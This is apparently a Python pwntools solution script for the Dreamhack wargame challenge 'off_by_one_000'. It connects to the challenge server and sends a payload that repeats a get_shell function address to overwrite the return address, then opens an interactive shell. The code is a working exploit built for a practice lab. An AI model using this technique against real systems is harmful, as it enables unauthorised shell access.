@@ -1,0 +1,26 @@
+from pwn import *
+
+
+'''
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+'''
+
+r = remote("host1.dreamhack.games", 14463)
+
+# r = process("./off_by_one_000")
+
+
+get_shell = 0x80485db
+
+payload = p32(get_shell) * (0x100 // 4)
+
+r.sendline(payload)
+
+r.interactive()
+
+
+
